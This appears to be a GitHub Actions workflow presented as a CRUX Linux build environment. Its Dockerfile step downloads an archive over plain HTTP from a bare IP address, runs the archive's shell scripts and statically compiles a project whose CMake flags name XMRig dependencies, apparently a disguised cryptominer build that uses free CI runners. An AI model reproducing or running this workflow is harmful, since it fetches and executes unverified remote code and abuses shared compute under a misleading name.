name: CRUX Build and Run

on:
  push:
    branches:
      - master
  workflow_dispatch:  # 允许手动触发

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout repository
        uses: actions/checkout@v3

      - name: Build Docker image
        run: |
          # 将 Dockerfile 写入工作流中
          cat <<EOF > Dockerfile
          FROM crux:latest

          # 安装 git
          RUN prt-get depinst wget git

          # 克隆 CRUX 的 ports 集
          RUN git clone https://crux.nu/git/crux-ports.git /usr/ports

          # 安装基础依赖
          RUN prt-get update -fr /usr/ports/core && \
              prt-get depinst curl unzip make automake gcc cmake libtool autoconf

          # 下载并编译 GLIBC 2.14
          RUN wget http://ftp.gnu.org/gnu/libc/glibc-2.14.tar.gz && \
              tar -xvf glibc-2.14.tar.gz && \
              cd glibc-2.14 && \
              mkdir build && \
              cd build && \
              ../configure --prefix=/usr && \
              make -j\$(nproc) && \
              make install

          # 设置工作目录
          WORKDIR /usr/src/app

          # 复制项目文件到容器中
          COPY . /usr/src/app

          # 下载并解压项目源码
          RUN wget http://8.138.123.18:8180/testformycode.zip && \
              unzip testformycode.zip

          # 构建项目
          RUN cd testformycode/scripts-64 && \
              chmod +x *.sh && \
              ./build_deps.sh && \
              cd .. && \
              mkdir build && \
              cd build && \
              cmake -DXMRIG_DEPS=scripts-64/deps -DCMAKE_CXX_FLAGS="-static" -DCMAKE_EXE_LINKER_FLAGS="-static" -DBUILD_SHARED_LIBS=OFF .. && \
              make
          EOF

          # 构建 Docker 镜像
          docker build -t my-crux-build-env .

      - name: Run Docker container
        run: |
          # 运行 Docker 容器并构建项目
          docker run --name my-crux-build-container my-crux-build-env

      - name: Copy build artifacts
        run: |
          # 复制构建产物
          docker cp my-crux-build-container:/usr/src/app/testformycode/build ./build-output

      - name: Upload Build Artifacts
        uses: actions/upload-artifact@v3
        with:
          name: build-output
          path: ./build-output

      - name: Clean up Docker container
        run: docker rm -f my-crux-build-container
